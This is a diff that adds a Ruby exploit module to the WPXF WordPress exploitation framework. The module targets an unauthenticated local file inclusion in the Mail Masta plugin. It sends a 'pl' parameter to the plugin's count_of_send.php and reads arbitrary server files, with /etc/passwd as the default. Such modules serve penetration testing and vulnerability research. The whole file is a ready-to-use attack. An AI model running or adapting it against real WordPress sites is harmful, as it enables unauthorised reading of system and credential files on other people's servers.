@@ -1,0 +1,43 @@
+class Wpxf::Auxiliary::MailMastaUnauthenticatedLocalFileInclusion < Wpxf::Module
+  include Wpxf::WordPress::FileDownload
+
+  def initialize
+    super
+
+    update_info(
+      name: 'Mail Masta Unauthenticated Local File Inclusion',
+      author: [
+        'Guillermo Garcia Marcos',         # Disclosure
+        'Rob Carr <rob[at]rastating.com>'  # WPXF module
+      ],
+      desc: 'This module exploits a vulnerability which allows you to include any arbitrary file '\
+            'accessible by the user the web server is running as into the executing script.',
+      references: [
+        ['WPVDB', '8609'],
+        ['EDB', '40290'],
+        ['URL', 'https://cxsecurity.com/issue/WLB-2016080220']
+      ],
+      date: 'Aug 23 2016'
+    )
+  end
+
+  def check
+    check_plugin_version_from_readme('mail-masta')
+  end
+
+  def working_directory
+    'wp-content/plugins/mail-masta/inc/campaign'
+  end
+
+  def default_remote_file_path
+    '/etc/passwd'
+  end
+
+  def downloader_url
+    normalize_uri(full_uri, working_directory, 'count_of_send.php')
+  end
+
+  def download_request_params
+    { pl: remote_file }
+  end
+end
